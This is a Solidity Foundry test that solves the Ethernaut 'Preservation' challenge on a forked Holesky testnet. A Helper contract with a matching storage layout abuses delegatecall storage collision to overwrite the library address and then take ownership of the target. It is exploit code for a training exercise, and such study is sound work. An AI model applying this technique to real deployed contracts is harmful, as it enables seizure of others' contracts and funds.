// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Preservation} from "../../src/Ethernaut/Preservation.sol";

contract PreservationAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Preservation preservation = Preservation(
            0x3Ac98969f343C75cEb8c09801474bf2e4AbDeEB3
        );
        Helper helper = new Helper();
        helper.attack(preservation);
        vm.stopPrank();
        assertTrue(preservation.owner() == playerAddress);
    }
}

contract Helper {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation preservation) public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
